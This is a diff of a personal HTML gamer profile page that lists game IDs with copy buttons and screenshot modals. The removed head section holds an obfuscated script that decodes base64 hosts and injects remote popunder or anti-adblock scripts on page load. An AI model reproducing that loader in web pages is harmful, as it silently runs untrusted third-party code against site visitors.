@@ -1,18 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-<script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var u=window,q="b443e3f01bffa5ffd2f85a5371599256",g=[["siteId",864+781+272+5197471],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],d=["d3d3LmFudGlhZGJsb2Nrc3lzdGVtcy5jb20vcWFsYWMubWluLmNzcw==","ZDNjb2Q4MHRobjdxbmQuY2xvdWRmcm9udC5uZXQvT2tJWUROL2F4c3MubWluLmpz"],e=-1,i,s,a=function(){clearTimeout(s);e++;if(d[e]&&!(1779549199000<(new Date).getTime()&&1<e)){i=u.document.createElement("script");i.type="text/javascript";i.async=!0;var l=u.document.getElementsByTagName("script")[0];i.src="https://"+atob(d[e]);i.crossOrigin="anonymous";i.onerror=a;i.onload=function(){clearTimeout(s);u[q.slice(0,16)+q.slice(0,16)]||a()};s=setTimeout(a,5E3);l.parentNode.insertBefore(i,l)}};if(!u[q]){try{Object.freeze(u[q]=g)}catch(e){}a()}})();
-/*]]>/* */
-</script>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Rejard Gaming Profile</title>
+<title>ImSoHardRN Gamer Profile</title>
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<!-- SWEET ALERT -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
 <style>
 
@@ -30,179 +28,254 @@ overflow-x:hidden;
 text-align:center;
 }
 
-/* matrix background */
+/* LOADING SCREEN */
+
+#loader{
+position:fixed;
+width:100%;
+height:100%;
+background:#020205;
+display:flex;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+z-index:9999;
+}
+
+.loaderCircle{
+width:80px;
+height:80px;
+border:5px solid #0f2c35;
+border-top:5px solid #00eaff;
+border-radius:50%;
+animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
+}
+
+.loaderText{
+margin-top:15px;
+color:#00eaff;
+font-size:14px;
+letter-spacing:2px;
+}
+
+/* PARTICLES */
 
 canvas{
 position:fixed;
 top:0;
 left:0;
-z-index:-2;
-}
-
-/* neon glow layer */
-
-body::before{
-
-content:"";
-position:fixed;
-width:100%;
-height:100%;
-background:radial-gradient(circle,#00eaff22,#000000);
 z-index:-1;
-
 }
 
-/* profile */
+/* PROFILE */
 
 .profile{
-
 margin-top:40px;
-
 }
 
 .avatar{
-
-width:100px;
-height:100px;
+width:110px;
+height:110px;
 border-radius:50%;
 border:3px solid #00eaff;
 box-shadow:0 0 25px #00eaff;
-
 }
 
 .name{
-
 font-size:28px;
-font-weight:bold;
 margin-top:10px;
-
+color:#00eaff;
+letter-spacing:2px;
 }
 
 .bio{
-
 opacity:.7;
-font-size:14px;
-
+font-size:16px;
 }
 
-/* container */
+/* CONTAINER */
 
 .container{
-
 max-width:420px;
 margin:auto;
 padding:15px;
-
 }
 
-/* game cards */
+/* GAME CARD */
 
 .game{
-
 display:flex;
 align-items:center;
-background:#0e0e16;
+background:#0c0c14;
 padding:16px;
 margin:14px 0;
-border-radius:14px;
-border:1px solid #222;
+border-radius:12px;
+border:1px solid #1c1c1c;
 cursor:pointer;
 transition:.3s;
-transform-style:preserve-3d;
-
 }
 
 .game:hover{
-
-transform:scale(1.05) rotateX(4deg) rotateY(4deg);
-box-shadow:0 0 25px #00eaff;
-
+transform:scale(1.04);
+box-shadow:0 0 20px #00eaff;
+border-color:#00eaff;
 }
 
 .logo{
-
 width:50px;
 height:50px;
-border-radius:10px;
+border-radius:8px;
 margin-right:14px;
-
 }
 
 .info{
-
 text-align:left;
 flex:1;
-
 }
 
 .gamename{
-
 font-weight:bold;
-
+font-size:16px;
+color:#00eaff;
 }
 
 .ign{
-
 font-size:12px;
 opacity:.7;
-
 }
 
 .uid{
-
-color:#00eaff;
 font-size:13px;
-
+color:#00eaff;
 }
 
-/* toast */
-
-.toast{
-
-position:fixed;
-bottom:30px;
-left:50%;
-transform:translateX(-50%);
-background:#00eaff;
-color:black;
-padding:12px 24px;
-border-radius:25px;
-font-weight:bold;
-display:none;
-
-}
-
-/* social */
+/* SOCIAL */
 
 .social{
-
 margin-top:30px;
-
 }
 
 .social a{
-
-font-size:30px;
-margin:18px;
+font-size:28px;
+margin:15px;
 color:white;
 transition:.3s;
-
 }
 
 .social a:hover{
-
 color:#00eaff;
 transform:scale(1.3);
+}
 
+/* MODAL */
+
+.modal{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.95);
+backdrop-filter:blur(8px);
+z-index:999;
+align-items:center;
+justify-content:center;
+}
+
+.modalBox{
+background:#0c0c14;
+padding:20px;
+width:90%;
+max-width:360px;
+border-radius:14px;
+border:1px solid #00eaff;
+box-shadow:0 0 25px #00eaff;
+text-align:center;
+}
+
+.modalShot{
+width:100%;
+border-radius:10px;
+margin-bottom:12px;
+}
+
+.modalTitle{
+font-size:22px;
+color:#00eaff;
+}
+
+.modalIGN{
+opacity:.8;
+margin-top:5px;
+}
+
+.modalUID{
+color:#00eaff;
+margin-top:5px;
+}
+
+/* NOTE */
+
+.gamerNote{
+margin-top:12px;
+padding:10px;
+border:1px solid #00eaff;
+border-radius:8px;
+background:#070707;
+font-size:13px;
+}
+
+/* BUTTON */
+
+.copyUIDbtn{
+margin-top:14px;
+background:#00eaff;
+border:none;
+padding:12px 20px;
+border-radius:30px;
+font-weight:bold;
+cursor:pointer;
+color:black;
+box-shadow:0 0 15px #00eaff;
+transition:.2s;
+}
+
+.copyUIDbtn:active{
+transform:scale(.9);
+}
+
+/* CLOSE */
+
+.closeModal{
+position:absolute;
+top:20px;
+right:25px;
+font-size:26px;
+cursor:pointer;
 }
 
 </style>
-
 </head>
 
 <body>
 
-<canvas id="matrix"></canvas>
+<!-- LOADER -->
+
+<div id="loader">
+
+<div class="loaderCircle"></div>
+
+<div class="loaderText">LOADING GAMER PROFILE...</div>
+
+</div>
+
+<canvas id="bg"></canvas>
 
 <div class="profile">
 
@@ -210,15 +283,24 @@ transform:scale(1.3);
 
 <div class="name">ImSoHardRN</div>
 
-<div class="bio">Tara laro pero wag kasakin ma-Highblood  </div>
+<div class="bio">Gaming connects players, builds friendships, and creates legends.</div>
 
 </div>
 
 <div class="container">
 
-<div class="game" onclick="copyUID('826467280')">
+<!-- MLBB -->
 
-<img class="logo" src="https://play-lh.googleusercontent.com/Op7v9XdsyxjrKImMD5RLyiLRCAHs3DMQFANwfsuMTw1hq0lH4j8tOqD3Fd7zyr4ixmC0xoqqRkQDBjAd46NsFQ=w480-h960-rw">
+<div class="game" onclick="openGame(
+'Mobile Legends',
+'IGN: ImSoHardRN',
+'UID: 826467280',
+'826467280',
+'https://raw.githubusercontent.com/hardasf/hardasf.github.io/refs/heads/main/Hehe/Mlbb/Screenshot_20260309-205955.jpg',
+'Main MOBA game. Mythic player.'
+)">
+
+<img class="logo" src="https://play-lh.googleusercontent.com/Op7v9XdsyxjrKImMD5RLyiLRCAHs3DMQFANwfsuMTw1hq0lH4j8tOqD3Fd7zyr4ixmC0xoqqRkQDBjAd46NsFQ=w240">
 
 <div class="info">
 <div class="gamename">Mobile Legends</div>
@@ -228,43 +310,37 @@ transform:scale(1.3);
 
 </div>
 
-<div class="game" onclick="copyUID('987654321')">
+<!-- CFL -->
+
+<div class="game" onclick="openGame(
+'CrossFire Legends',
+'IGN: ImSoHardRN',
+'UID: 1801559058',
+'1801559058',
+'https://raw.githubusercontent.com/hardasf/hardasf.github.io/refs/heads/main/Hehe/Cal/cf_2026-02-23_10-18-10.png',
+'Walang tutuk pero tutuklaw.'
+)">
 
 <img class="logo" src="https://play-lh.googleusercontent.com/mk1O80b1r2M_osuXkMEGOtgUKNTevJBPIJbdcBEaRMxEshuRUlQ-fwyIP74TYR0a59PCSdCSR5Lgyg2LapwN=w480-h960-rw">
 
 <div class="info">
-<div class="gamename">Crossfire Legends</div>
+<div class="gamename">CrossFire Legends</div>
 <div class="ign">IGN: ImSoHardRN</div>
-<div class="uid">ID: 1801559058</div>
-</div>
-
-</div>
-<!--
-<div class="game" onclick="copyUID('COD998877')">
-
-<img class="logo" src="https://play-lh.googleusercontent.com/0DENLOaGXbadNpuWBLJf4lEhJCJmQV5Na1k5L311-sDPSncoW6_kDLsG_Vc4N0_AM_IGEf3cKTHGHKAyBYAe=w480-h960-rw">
-
-<div class="info">
-<div class="gamename">Call of Duty Mobile</div>
-<div class="ign">IGN: YourName</div>
-<div class="uid">UID: COD998877</div>
-</div>
-
-</div>
--->
-<div class="game" onclick="copyUID('#LYVQPGPQP')">
-
-<img class="logo" src="https://play-lh.googleusercontent.com/sFmWfYbYp_2ea7VRMTnwd3gjIBrPGXHj_d_ab1_k1q1p2OMk4riGMF1vqxdhONOtTYOt_BVpk7a4AYcKU68LNGQ=w480-h960-rw">
-
-<div class="info">
-<div class="gamename">Clash of Clans</div>
-<div class="ign">IGN: ImSoH4rdRN</div>
-<div class="uid">Player Tag: #LYVQPGPQP</div>
+<div class="uid">UID: 1801559058</div>
 </div>
 
 </div>
 
-<div class="game" onclick="copyUID('2261315676304066193')">
+<!-- HOK -->
+
+<div class="game" onclick="openGame(
+'Honor of Kings',
+'IGN: ImSoHardRN',
+'UID: 2261315676304066193',
+'2261315676304066193',
+'https://raw.githubusercontent.com/hardasf/hardasf.github.io/refs/heads/main/Hehe/Cal/Screenshot_20260309-214806.jpg',
+'ML is for kids HOK is for Pro hshshshs.'
+)">
 
 <img class="logo" src="https://play-lh.googleusercontent.com/hEm5NVeEv7UfFJaK8GZdfWe7p3DB_VvYx57qIEHbR0tMV_NToziH0Vbgd6CxLiWF-iURpAe-jsC_UGUDt0diPQ=w480-h960-rw">
 
@@ -276,7 +352,37 @@ transform:scale(1.3);
 
 </div>
 
-<div class="game" onclick="copyUID('52220886667')">
+
+<!-- COC -->
+
+<div class="game" onclick="openGame(
+'Clash of Clans',
+'IGN: ImSoH4rdRN',
+'UID: #LYVQPGPQP',
+'#LYVQPGPQP',
+'https://raw.githubusercontent.com/hardasf/hardasf.github.io/refs/heads/main/Hehe/Cal/Screenshot_20260309-214835.jpg',
+'Bihira nalang ako maglaro neto uie'
+)">
+
+<img class="logo" src="https://play-lh.googleusercontent.com/sFmWfYbYp_2ea7VRMTnwd3gjIBrPGXHj_d_ab1_k1q1p2OMk4riGMF1vqxdhONOtTYOt_BVpk7a4AYcKU68LNGQ=w480-h960-rw">
+
+<div class="info">
+<div class="gamename">Clash of Clans</div>
+<div class="ign">IGN: ImSoH4rdRN</div>
+<div class="uid">PLAYER TAG: #LYVQPGPQP</div>
+</div>
+
+</div>
+<!-- PUBG -->
+
+<div class="game" onclick="openGame(
+'PUBG Mobile',
+'IGN: ImSoHardRN',
+'UID: 52220886667', 
+'52220886667',
+'https://raw.githubusercontent.com/hardasf/hardasf.github.io/refs/heads/main/Hehe/Cal/Screenshot_20260309-214307.jpg',
+'Squad player. Tactical gameplay.'
+)">
 
 <img class="logo" src="https://play-lh.googleusercontent.com/zCSGnBtZk0Lmp1BAbyaZfLktDzHmC6oke67qzz3G1lBegAF2asyt5KzXOJ2PVdHDYkU=w480-h960-rw">
 
@@ -292,83 +398,138 @@ transform:scale(1.3);
 
 <div class="social">
 
-<a href="https://www.facebook.com/leechshares"><i class="fab fa-facebook"></i></a>
-<!--a href="#"><i class="fab fa-youtube"></i></a>-->
-<a href="https://tiktok.com/@imsohardrn"><i class="fab fa-tiktok"></i></a>
+<a href="#"><i class="fab fa-facebook"></i></a>
+<a href="#"><i class="fab fa-tiktok"></i></a>
+<a href="#"><i class="fab fa-youtube"></i></a>
 
 </div>
 
-<div id="toast" class="toast">UID Copied!</div>
+<div id="gameModal" class="modal">
 
-<audio id="sound">
-<source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_7f9b1c1f8c.mp3">
-</audio>
+<div class="modalBox">
+
+<span class="closeModal" onclick="closeModal()">×</span>
+
+<img id="modalShot" class="modalShot">
+
+<div class="modalTitle" id="modalTitle"></div>
+<div class="modalIGN" id="modalIGN"></div>
+<div class="modalUID" id="modalUID"></div>
+<div class="gamerNote" id="gamerNote"></div>
+
+
+<button id="copyBtn" class="copyUIDbtn" onclick="copyUID()">COPY UID</button>
+
+</div>
+
+</div>
+
+<footer style="text-align:center; padding:12px; font-family:Courier New, monospace; font-size:15px; color:#87CEEB; text-shadow: 1px 1px 2px #000;">
+  🎮 Crafted by 💓 Rejard | 2026
+</footer>
 
 <script>
 
-/* copy UID */
+/* LOADER */
 
-function copyUID(uid){
-
-navigator.clipboard.writeText(uid)
-
-document.getElementById("sound").play()
-
-let t=document.getElementById("toast")
-
-t.style.display="block"
+window.onload=function(){
 
 setTimeout(()=>{
-
-t.style.display="none"
-
-},2000)
+document.getElementById("loader").style.display="none"
+},1200)
 
 }
 
-/* matrix background */
+/* PARTICLES */
 
-const canvas=document.getElementById("matrix")
+const canvas=document.getElementById("bg")
 const ctx=canvas.getContext("2d")
 
-canvas.width=window.innerWidth
-canvas.height=window.innerHeight
+canvas.width=innerWidth
+canvas.height=innerHeight
 
-let letters="01"
-letters=letters.split("")
+let particles=[]
 
-let fontSize=14
-let columns=canvas.width/fontSize
+for(let i=0;i<70;i++){
 
-let drops=[]
+particles.push({
 
-for(let i=0;i<columns;i++)
-drops[i]=1
+x:Math.random()*canvas.width,
+y:Math.random()*canvas.height,
+r:Math.random()*2
+
+})
+
+}
 
 function draw(){
 
-ctx.fillStyle="rgba(0,0,0,0.05)"
-ctx.fillRect(0,0,canvas.width,canvas.height)
+ctx.clearRect(0,0,canvas.width,canvas.height)
 
 ctx.fillStyle="#00eaff"
-ctx.font=fontSize+"px monospace"
 
-for(let i=0;i<drops.length;i++){
+particles.forEach(p=>{
 
-let text=letters[Math.floor(Math.random()*letters.length)]
+ctx.beginPath()
+ctx.arc(p.x,p.y,p.r,0,Math.PI*2)
+ctx.fill()
 
-ctx.fillText(text,i*fontSize,drops[i]*fontSize)
+p.y+=0.4
 
-if(drops[i]*fontSize>canvas.height && Math.random()>0.975)
-drops[i]=0
+if(p.y>canvas.height)p.y=0
 
-drops[i]++
+})
+
+requestAnimationFrame(draw)
 
 }
 
+draw()
+
+/* MODAL */
+
+let selectedUID=""
+
+function openGame(title,ign,uid,copyuid,shot,note){
+
+document.getElementById("gameModal").style.display="flex"
+
+document.getElementById("modalTitle").innerText=title
+document.getElementById("modalIGN").innerText=ign
+document.getElementById("modalUID").innerText=uid
+document.getElementById("modalShot").src=shot
+document.getElementById("gamerNote").innerText="Gamer's Note: "+note
+
+document.getElementById("copyBtn").innerText="COPY UID"
+
+selectedUID=copyuid
+
 }
 
-setInterval(draw,33)
+function closeModal(){
+document.getElementById("gameModal").style.display="none"
+}
+
+/* COPY UID */
+
+function copyUID(){
+
+navigator.clipboard.writeText(selectedUID)
+
+let btn=document.getElementById("copyBtn")
+
+btn.innerText="COPIED ✔"
+
+Swal.fire({
+
+icon:'success',
+title:'UID Copied!',
+text:'Player UID copied to clipboard',
+confirmButtonColor:'#00eaff'
+
+})
+
+}
 
 </script>
 
